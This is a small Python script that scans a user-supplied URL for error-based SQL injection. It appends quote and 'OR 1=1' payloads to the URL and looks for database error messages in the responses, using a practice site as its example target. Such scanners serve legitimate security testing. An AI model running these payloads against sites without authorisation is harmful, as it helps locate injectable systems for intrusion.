import requests
import sys

def check_sqli(url):
    print(f"\n[+] Testing {url} for SQL Injection...")
    
    # List of common "Error-Based" SQL Injection payloads
    payloads = [
        "'", 
        '"', 
        "' OR '1'='1", 
        '" OR "1"="1'
    ]
    
    # Common database error messages to look for in the response
    errors = [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    
    vulnerable = False

    for payload in payloads:
        # Construct the malicious URL (e.g., http://site.com/id=1')
        target_url = f"{url}{payload}"
        print(f"  > Testing payload: {payload}")
        
        try:
            # Send the request
            response = requests.get(target_url)
            
            # Check if any database error appears in the page text
            for error in errors:
                if error in response.text:
                    print(f"\n[!!!] VULNERABILITY FOUND!")
                    print(f"      Payload: {payload}")
                    print(f"      Error: {error}")
                    vulnerable = True
                    break # Stop testing if we found one
        except:
            print("  [!] Connection Error")
            
        if vulnerable:
            break

    if not vulnerable:
        print("\n[-] No obvious SQL Injection errors found.")

if __name__ == "__main__":
    # Ask user for input
    target = input("Enter URL to test (e.g., http://testphp.vulnweb.com/artists.php?artist=1): ")
    check_sqli(target)